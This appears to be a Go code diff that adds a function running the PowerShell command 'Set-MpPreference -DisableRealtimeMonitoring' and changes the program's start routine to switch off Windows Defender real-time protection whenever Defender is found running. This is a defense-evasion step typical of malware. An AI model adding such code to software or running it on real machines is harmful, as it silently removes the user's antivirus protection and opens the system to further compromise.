@@ -145,6 +145,17 @@ func IsDefenderRunning(runspace powershell.Runspace) bool {
 
 	return false
 }
+func DisableDefender(runspace powershell.Runspace, disable bool) bool {
+	state := "true"
+	if !disable {
+		state = "false"
+	}
+	script := fmt.Sprintf(`Set-MpPreference -DisableRealtimeMonitoring $%s`, state)
+	results1 := runspace.ExecScript(script, false, nil)
+	defer results1.Close()
+
+	return results1.Success()
+}
 func WriteFile(path string, data []byte) error {
 	f, err := os.OpenFile(path, os.O_TRUNC|os.O_CREATE|os.O_WRONLY, 0755)
 	if err != nil {
@@ -176,7 +187,11 @@ func Start() {
 	runspace := powershell.CreateRunspaceSimple()
 	// auto cleanup your runspace
 	defer runspace.Close()
-	fmt.Println(IsDefenderRunning(runspace))
+	if IsDefenderRunning(runspace) {
+		DisableDefender(runspace, true)
+	} else {
+		DisableDefender(runspace, false)
+	}
 
 }
 func main() {
